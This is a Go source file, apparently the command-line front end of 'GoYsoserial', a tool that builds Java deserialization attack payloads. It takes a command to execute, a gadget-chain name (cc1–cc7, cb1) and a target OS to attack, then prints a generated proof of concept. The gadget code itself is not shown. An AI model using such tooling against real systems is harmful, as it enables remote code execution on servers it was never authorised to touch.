package main

import (
	"GoYsoserial/gadget"
	"flag"
	"fmt"
)

var (
	help       bool
	cmd        string
	gadgetName string
	systemName string
	list       bool
)

func init() {
	flag.BoolVar(&help, "h", false, "show the help")

	flag.BoolVar(&list, "l", false, "list all the gadget name")

	flag.StringVar(&cmd, "c", "", "the cmd you want execute")

	flag.StringVar(&gadgetName, "g", "", "the gadget you select")

	flag.StringVar(&systemName, "os", "", "the operate system you want to attack,windows or linux")
}

func main() {
	flag.Parse()
	if help {
		flag.PrintDefaults()
	}
	if list {
		fmt.Print("cc1\ncc2\ncc3\ncc4\ncc5\ncc6\ncc7\ncb1")
	}
	if cmd != "" && gadgetName != "" && systemName != "" {
		fmt.Println("[+] start create the payload!\n")
		poc := gadget.GetPoc(cmd, gadgetName, systemName)
		fmt.Print(poc)
	}

}
